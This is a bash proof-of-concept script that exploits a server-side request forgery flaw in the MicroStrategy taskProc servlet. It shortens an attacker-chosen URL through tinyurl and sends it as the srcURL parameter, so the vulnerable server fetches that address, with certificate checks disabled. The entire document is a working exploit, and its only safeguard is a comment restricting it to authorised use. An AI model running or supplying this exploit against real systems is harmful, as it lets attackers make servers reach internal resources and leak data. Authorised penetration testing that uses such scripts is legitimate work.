#!/bin/bash
# MicroStrategy taskProc servlet SSRF POC
# Only for use with express permission of the system owner!
# Author: Tony West (@Un4gi)

if [[ "$1" == "-h" || "$1" == "" || "$2" == "" || "$2" == "-h" ]]; then
    echo "Usage: $0 vulnerableDomain targetURL"
    exit 0
fi

TARGET="https://$1/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=json&srcURL="
PROTO="http://"
TINY=$(curl "https://tinyurl.com/api-create.php?url=$2" 2>/dev/null| awk '{ print substr( $0, 9 ) } ')
curl -k "$TARGET$PROTO$TINY"
